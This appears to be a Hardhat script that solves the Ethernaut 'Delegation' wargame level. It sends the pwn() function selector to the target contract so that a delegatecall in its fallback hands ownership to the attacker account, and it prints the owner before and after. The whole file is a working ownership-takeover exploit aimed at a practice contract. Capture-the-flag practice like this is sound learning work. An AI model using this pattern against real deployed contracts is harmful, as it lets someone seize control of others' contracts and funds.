import {ethers} from "hardhat"
import dotenv from 'dotenv'

dotenv.config()

async function main() {
    const instanceAddress = process.env.TARGET_ADDRESS_6!
    const [attacker] = await ethers.getSigners()
    const target = await ethers.getContractAt('Delegation', instanceAddress)
    const calldata = ethers.dataSlice(ethers.keccak256(ethers.toUtf8Bytes(`pwn()`)), 0, 4);

    console.log(`current owner: ${await target.owner()}`)
    await attacker.sendTransaction({
        to: instanceAddress,
        data: calldata,
        gasLimit: 100000,
        maxFeePerGas: 100000000,
        maxPriorityFeePerGas: 0
    })
    console.log(`current owner: ${await target.owner()}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
